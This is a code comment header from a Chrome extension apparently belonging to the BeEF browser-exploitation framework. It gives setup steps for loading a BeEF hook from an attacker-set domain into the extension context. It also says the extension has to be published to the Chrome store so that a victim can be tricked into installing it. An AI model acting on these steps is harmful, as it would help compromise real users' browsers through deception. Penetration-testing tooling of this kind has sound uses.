    // Simple chrome extension, by antisnatchor and Mike Haworth
    // Just loads BeEF into the extension context.
    //
    // 1. You need to set the IP address (better the domain) of the BeEF hook in background.js
    // 2. The BeEF hook address must be == to the CSP allowed domain here below. BeEF must listen on port 443, with TLS enabled.
    //    Only localhost origin is allowed to load scripts from non HTTPS resources. For anything else, you must use HTTPS.
    // 4. You need to upload the extension, as a zip file, to Google Chrome store.
    //    In latest versions of Chrome (>= 21) you can't install an extension from a different location anymore,
    //    so the extension can't be served by BeEF anymore. You need to trick the victim to install
    //    the extension from Google Chrome store.
